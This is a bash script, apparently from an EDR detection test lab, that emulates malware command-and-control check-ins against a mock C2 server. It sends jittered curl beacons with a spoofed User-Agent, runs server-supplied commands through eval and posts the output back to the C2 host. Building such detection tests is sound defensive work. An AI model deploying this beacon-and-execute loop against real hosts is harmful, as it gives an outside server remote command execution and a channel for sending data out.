#!/bin/bash
#
# simulate-c2-beacon.sh
# ---------------------------------------------------------------------------
# EDR DETECTION TEST — LAB USE ONLY
#
# Emulates malware check-in behaviour against the lab's mock C2
# (services/mock_c2.py): periodic, jittered beacons with a spoofed benign
# User-Agent, occasionally fetching and "executing" the mock's hardcoded
# no-op decoy task. All traffic stays on the lab's internal `labnet` bridge.
#
#   periodic jittered beacon        C2 over web protocol      (T1071.001)
#   custom beacon interval/jitter   Non-standard/custom C2 behaviour (T1573, T1008)
#   fetch + run decoy task          Execution via C2 channel   (T1059 / T1105)
#
# Usage: BEACON_COUNT=10 bash test-scripts/simulate-c2-beacon.sh
# ---------------------------------------------------------------------------
set -u

C2_HOST="${C2_HOST:-mock-c2}"
C2_PORT="${C2_PORT:-8443}"
RESULTS_DIR="${RESULTS_DIR:-/home/root/results}"
BEACON_COUNT="${BEACON_COUNT:-6}"
SESSION="$(date +%s)"
LOG="${RESULTS_DIR}/c2beacon_${SESSION}.log"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"  # benign-looking spoof

mkdir -p "$RESULTS_DIR"
say() { echo -e "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
step() { echo "" | tee -a "$LOG"; say "=== $* ==="; }

say "EDR test lab :: C2 beacon emulation :: session=$SESSION"
say "target=${C2_HOST}:${C2_PORT} beacons=${BEACON_COUNT}"

step "C2 beaconing with jittered interval (ATT&CK T1071.001, T1573)"
for i in $(seq 1 "$BEACON_COUNT"); do
    RESP="$(curl -s --max-time 5 -A "$UA" "http://${C2_HOST}:${C2_PORT}/beacon?i=${i}&session=${SESSION}")"
    say "beacon #$i -> $RESP"

    if echo "$RESP" | grep -q 'echo edr-lab-c2-decoy-task-executed'; then
        step "executing decoy task returned by C2 (ATT&CK T1059/T1105)"
        OUT="$(eval "$(echo "$RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin)["task"]["command"])' 2>/dev/null)" 2>&1)"
        say "task output: $OUT"
        curl -s --max-time 5 -X POST -d "task_id=lab-decoy-task-0001 output=${OUT}" \
            "http://${C2_HOST}:${C2_PORT}/task-result" >/dev/null
        say "posted task-result back to C2"
    fi

    JITTER="$(( (RANDOM % 4) + 1 ))"
    [ "$i" -lt "$BEACON_COUNT" ] && { say "sleeping ${JITTER}s jitter before next beacon"; sleep "$JITTER"; }
done

step "Done — ${BEACON_COUNT} beacons sent."
say "artifacts: $LOG  (server-side log: results/mock_c2_beacons.log)"
